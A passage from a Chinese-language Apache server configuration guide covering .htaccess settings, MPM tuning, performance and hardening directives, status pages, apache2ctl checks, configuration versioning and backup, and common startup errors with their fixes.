# ====== 缓存控制 ======

<IfModule mod_expires.c>
    ExpiresActive On
    ExpiresByType image/jpeg "access plus 1 year"
    ExpiresByType image/png "access plus 1 year"
    ExpiresByType text/css "access plus 1 month"
    ExpiresByType application/javascript "access plus 1 month"
</IfModule>

# ====== 安全头 ======

<IfModule mod_headers.c>
    Header set X-Frame-Options "SAMEORIGIN"
    Header set X-Content-Type-Options "nosniff"
    Header set X-XSS-Protection "1; mode=block"
    Header set Referrer-Policy "strict-origin-when-cross-origin"
</IfModule>

# ====== 字符编码 ======

AddDefaultCharset UTF-8

# ====== PHP配置（如果允许）======

php_flag display_errors Off
php_value upload_max_filesize 10M
php_value post_max_size 10M
php_value max_execution_time 30
php_value memory_limit 128M

# ====== 禁用PHP执行（上传目录）======

# 在上传目录中禁用PHP
<FilesMatch "\.php$">
    Require all denied
</FilesMatch>

# 或使用
php_flag engine off
AddType text/plain .php .php3 .phtml

# ====== 性能优化 ======

# 启用KeepAlive
Header set Connection keep-alive

# ETags
FileETag None
Header unset ETag

# ====== CORS配置 ======

<IfModule mod_headers.c>
    Header set Access-Control-Allow-Origin "*"
    Header set Access-Control-Allow-Methods "GET, POST, OPTIONS"
    Header set Access-Control-Allow-Headers "Content-Type"
</IfModule>

# ====== 限制HTTP方法 ======

<LimitExcept GET POST HEAD>
    Require all denied
</LimitExcept>
```

---

### 7. MPM配置文件详解

多处理模块（Multi-Processing Module）控制Apache如何处理并发请求。

##### 7.1 mpm_prefork.conf - 预派生模式

**特点：** 多进程，每个进程单线程，兼容性最好但资源占用较大。

```apache
<IfModule mpm_prefork_module>
    # 启动时创建的子进程数
    StartServers             5
    
    # 最小空闲子进程数
    # 如果空闲进程少于此值，会创建新进程
    MinSpareServers          5
    
    # 最大空闲子进程数
    # 如果空闲进程超过此值，会终止多余进程
    MaxSpareServers          10
    
    # 同时处理的最大请求数（即最大子进程数）
    MaxRequestWorkers        150
    
    # 每个子进程处理的最大请求数后重启
    # 0表示永不重启（推荐设置为非0值防止内存泄漏）
    MaxConnectionsPerChild   10000
    
    # 服务器负载的绝对最大值
    # ServerLimit            256
</IfModule>
```

**计算公式：**
- 内存需求 ≈ MaxRequestWorkers × 每个进程内存使用量
- 示例：如果每个Apache进程使用20MB内存
  - MaxRequestWorkers = 150
  - 总内存需求 ≈ 150 × 20MB = 3GB

**推荐配置（不同场景）：**

```apache
# 小型服务器（1-2GB RAM）
StartServers             2
MinSpareServers          2
MaxSpareServers          5
MaxRequestWorkers        50
MaxConnectionsPerChild   3000

# 中型服务器（4-8GB RAM）
StartServers             5
MinSpareServers          5
MaxSpareServers          10
MaxRequestWorkers        150
MaxConnectionsPerChild   10000

# 大型服务器（16GB+ RAM）
StartServers             10
MinSpareServers          10
MaxSpareServers          20
MaxRequestWorkers        400
MaxConnectionsPerChild   10000
```

##### 7.2 mpm_worker.conf - 工作者模式

**特点：** 多进程多线程，性能好，资源占用适中。

```apache
<IfModule mpm_worker_module>
    # 启动时创建的子进程数
    StartServers             2
    
    # 最小空闲线程数
    MinSpareThreads          25
    
    # 最大空闲线程数
    MaxSpareThreads          75
    
    # 每个子进程的线程数
    ThreadsPerChild          25
    
    # 最大并发连接数
    # MaxRequestWorkers = ServerLimit × ThreadsPerChild
    MaxRequestWorkers        150
    
    # 每个子进程处理的最大请求数
    MaxConnectionsPerChild   0
    
    # 最大子进程数限制
    # ServerLimit            16
    
    # 每个子进程的最大线程数限制
    # ThreadLimit            64
</IfModule>
```

**计算示例：**
```
如果 ThreadsPerChild = 25，ServerLimit = 16
则 MaxRequestWorkers 最大可以设置为：16 × 25 = 400
```

**推荐配置：**

```apache
# 中型服务器（4-8GB RAM）
StartServers             3
MinSpareThreads          25
MaxSpareThreads          75
ThreadsPerChild          25
MaxRequestWorkers        150
MaxConnectionsPerChild   10000

# 高流量服务器（16GB+ RAM）
StartServers             4
MinSpareThreads          50
MaxSpareThreads          150
ThreadsPerChild          50
MaxRequestWorkers        400
MaxConnectionsPerChild   10000
ServerLimit              16
```

##### 7.3 mpm_event.conf - 事件模式（推荐）

**特点：** 类似worker但处理Keep-Alive更高效，推荐用于高性能场景。

```apache
<IfModule mpm_event_module>
    # 启动时创建的子进程数
    StartServers             2
    
    # 最小空闲线程数
    MinSpareThreads          25
    
    # 最大空闲线程数
    MaxSpareThreads          75
    
    # 每个子进程的线程数
    ThreadsPerChild          25
    
    # 最大并发连接数
    MaxRequestWorkers        150
    
    # 每个子进程处理的最大请求数
    MaxConnectionsPerChild   0
    
    # 每个子进程的最大线程数限制
    ThreadLimit              64
    
    # 最大子进程数限制
    # ServerLimit            16
    
    # 异步请求处理线程数
    # AsyncRequestWorkerFactor 2
</IfModule>
```

**Event MPM专用参数：**
- `AsyncRequestWorkerFactor` - 异步连接处理因子
  - 最大并发连接数 = MaxRequestWorkers × AsyncRequestWorkerFactor
  - 默认值为2，适用于Keep-Alive连接多的场景

**高性能配置示例：**

```apache
<IfModule mpm_event_module>
    StartServers             3
    MinSpareThreads          50
    MaxSpareThreads          150
    ThreadsPerChild          50
    ThreadLimit              64
    MaxRequestWorkers        400
    MaxConnectionsPerChild   10000
    ServerLimit              16
    AsyncRequestWorkerFactor 2
</IfModule>
```

**切换MPM模块：**

```bash
# 查看当前MPM
apache2ctl -V | grep -i mpm

# 禁用当前MPM
sudo a2dismod mpm_prefork

# 启用新的MPM
sudo a2enmod mpm_event

# 重启Apache
sudo systemctl restart apache2
```

---

### 8. 性能调优参数总结

### 8.1 全局性能参数（apache2.conf）

```apache
# ====== 连接管理 ======

# 请求超时时间（秒）
Timeout 300

# 启用持久连接
KeepAlive On

# 持久连接的最大请求数
MaxKeepAliveRequests 100

# 持久连接超时时间（秒）
# 建议设置为2-5秒以提高并发能力
KeepAliveTimeout 5

# ====== 请求限制 ======

# 限制请求体大小（字节）
LimitRequestBody 10485760        # 10MB

# 限制请求头字段数量
LimitRequestFields 100

# 限制请求头字段大小（字节）
LimitRequestFieldSize 8190

# 限制请求行大小（字节）
LimitRequestLine 8190

# ====== 主机名查找 ======

# 禁用DNS反向查找（提高性能）
HostnameLookups Off

# ====== 文件系统访问 ======

# 禁用符号链接所有权匹配检查（提高性能）
# Options +FollowSymLinks

# 启用文件系统缓存
EnableMMAP On
EnableSendfile On
```

##### 8.2 服务器资源配置建议

**小型网站（共享主机级别）：**
- 内存：1-2GB
- 预期并发：20-50
```apache
MaxRequestWorkers        50
KeepAliveTimeout         2
MaxConnectionsPerChild   3000
```

**中型网站（VPS/小型服务器）：**
- 内存：4-8GB
- 预期并发：100-200
```apache
MaxRequestWorkers        150
KeepAliveTimeout         3
MaxConnectionsPerChild   5000
```

**大型网站（专用服务器）：**
- 内存：16GB+
- 预期并发：500+
```apache
MaxRequestWorkers        400
KeepAliveTimeout         5
MaxConnectionsPerChild   10000
```

---

### 9. 安全配置参数详解

##### 9.1 服务器标识（apache2.conf或security.conf）

```apache
# 服务器标识信息控制
# Prod - 仅显示 "Apache"
# Major - 显示 "Apache/2"
# Minor - 显示 "Apache/2.4"
# Min - 显示 "Apache/2.4.X"
# OS - 显示 "Apache/2.4.X (Debian)"
# Full - 显示完整信息（默认，不安全）
ServerTokens Prod

# 关闭错误页面中的服务器签名
ServerSignature Off

# 禁用TRACE方法（防止XST攻击）
TraceEnable Off
```

##### 9.2 访问控制最佳实践

```apache
# 默认拒绝策略
<Directory />
    Options None
    AllowOverride None
    Require all denied
</Directory>

# 仅开放需要的目录
<Directory /var/www/html>
    Options -Indexes +FollowSymLinks
    AllowOverride FileInfo AuthConfig
    Require all granted
</Directory>

# 保护敏感文件
<FilesMatch "^\.ht|\.git|\.svn|\.env|composer\.(json|lock)|package\.json">
    Require all denied
</FilesMatch>

# 限制HTTP方法
<LimitExcept GET POST HEAD>
    Require all denied
</LimitExcept>

# 防止目录遍历
<DirectoryMatch "^/.*/\.">
    Require all denied
</DirectoryMatch>
```

---

### 10. 故障排查配置参数

```apache
# ====== 调试日志级别 ======

# 生产环境
LogLevel warn

# 开发/调试环境
LogLevel info ssl:warn rewrite:trace3

# 详细调试（会产生大量日志）
LogLevel debug

# ====== 核心转储（崩溃调试）======

# 在envvars中启用
# ulimit -c unlimited
# CoreDumpDirectory /tmp

# ====== 扩展状态 ======

<IfModule mod_status.c>
    <Location /server-status>
        SetHandler server-status
        Require local
        # Require ip 192.168.1.0/24
    </Location>
    
    # 启用扩展状态信息
    ExtendedStatus On
</IfModule>

# ====== 服务器信息 ======

<IfModule mod_info.c>
    <Location /server-info>
        SetHandler server-info
        Require local
    </Location>
</IfModule>
```

**访问服务器状态：**
```bash
# 文本格式
curl http://localhost/server-status

# 自动刷新格式
curl http://localhost/server-status?auto

# 在浏览器中访问
http://localhost/server-status
```

---

### 11. 配置文件验证与测试

```bash
# ====== 语法检查 ======

# 测试配置文件语法
sudo apache2ctl configtest
sudo apache2ctl -t

# 显示解析后的配置
sudo apache2ctl -S

# ====== 配置转储 ======

# 转储虚拟主机配置
sudo apache2ctl -t -D DUMP_VHOSTS

# 转储运行时配置
sudo apache2ctl -t -D DUMP_RUN_CFG

# 转储包含的文件
sudo apache2ctl -t -D DUMP_INCLUDES

# 转储加载的模块
sudo apache2ctl -M

# ====== 配置信息 ======

# 显示编译选项
apache2ctl -V

# 显示内建模块
apache2ctl -l

# 查找配置文件位置
apache2ctl -V | grep SERVER_CONFIG_FILE
```

---

### 12. 配置文件最佳实践

##### 12.1 配置文件组织建议

```bash
/etc/apache2/
├── apache2.conf          # 仅包含全局核心配置
├── ports.conf            # 仅包含端口配置
├── sites-available/      # 虚拟主机配置（完整配置）
│   ├── example.com.conf
│   └── test.local.conf
├── sites-enabled/        # 符号链接到已启用的站点
├── conf-available/       # 自定义配置片段
│   ├── security.conf
│   └── performance.conf
└── conf-enabled/         # 符号链接到已启用的配置
```

##### 12.2 配置文件命名规范

```bash
# 虚拟主机配置文件命名
001-mainsite.conf        # 使用数字前缀控制加载顺序
010-example.com.conf     # 主域名
020-test.local.conf      # 测试站点

# 配置片段命名
security.conf            # 安全配置
performance.conf         # 性能配置
custom-errors.conf       # 自定义错误页面
```

##### 12.3 配置文件注释规范

```apache
# ============================================
# 虚拟主机：example.com
# 用途：生产环境主站
# 创建：2024-01-15
# 修改：2024-11-05
# ============================================

<VirtualHost *:80>
    # ------ 基本配置 ------
    ServerName example.com
    DocumentRoot /var/www/example
    
    # ------ 日志配置 ------
    ErrorLog ${APACHE_LOG_DIR}/example-error.log
    CustomLog ${APACHE_LOG_DIR}/example-access.log combined
    
    # ------ 安全配置 ------
    # 禁用目录列表
    <Directory /var/www/example>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    
    # TODO: 添加SSL配置
    # FIXME: 优化缓存策略
</VirtualHost>
```

##### 12.4 配置版本控制

```bash
# 初始化Git仓库
cd /etc/apache2
sudo git init
sudo git add .
sudo git commit -m "Initial Apache configuration"

# 修改配置后提交
sudo nano sites-available/example.com.conf
sudo git add sites-available/example.com.conf
sudo git commit -m "Updated example.com: added SSL configuration"

# 回滚配置
sudo git log --oneline
sudo git checkout <commit-hash> -- sites-available/example.com.conf
sudo systemctl reload apache2
```

##### 12.5 配置备份脚本

```bash
#!/bin/bash
# /usr/local/bin/backup-apache-config.sh

BACKUP_DIR="/backup/apache"
DATE=$(date +%Y%m%d-%H%M%S)

mkdir -p $BACKUP_DIR

# 备份配置
tar -czf $BACKUP_DIR/apache-config-$DATE.tar.gz \
    /etc/apache2/ \
    /etc/ssl/certs/ \
    /etc/ssl/private/

# 保留最近30天的备份
find $BACKUP_DIR -name "apache-config-*.tar.gz" -mtime +30 -delete

echo "Backup completed: $BACKUP_DIR/apache-config-$DATE.tar.gz"
```

---

### 13. 常见配置错误与解决

### 错误1：配置语法错误
```
AH00526: Syntax error on line 42 of /etc/apache2/sites-enabled/example.com.conf:
Invalid command 'SeverName', perhaps misspelled
```
**解决：** 检查拼写，应为 `ServerName`

### 错误2：模块未加载
```
Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included
```
**解决：**
```bash
sudo a2enmod rewrite
sudo systemctl restart apache2
```

### 错误3：端口冲突
```
(98)Address already in use: AH00072: make_sock: could not bind to address [::]:80
```
**解决：**
```bash
# 查找占用端口的进程
sudo netstat -tlnp | grep :80
sudo fuser -k 80/tcp
```

### 错误4：权限问题
```
AH01630: client denied by server configuration
```
**解决：** 检查 `Require` 指令和目录权限
```apache
<Directory /var/www/html>
    Require all granted
</Directory>
```

---

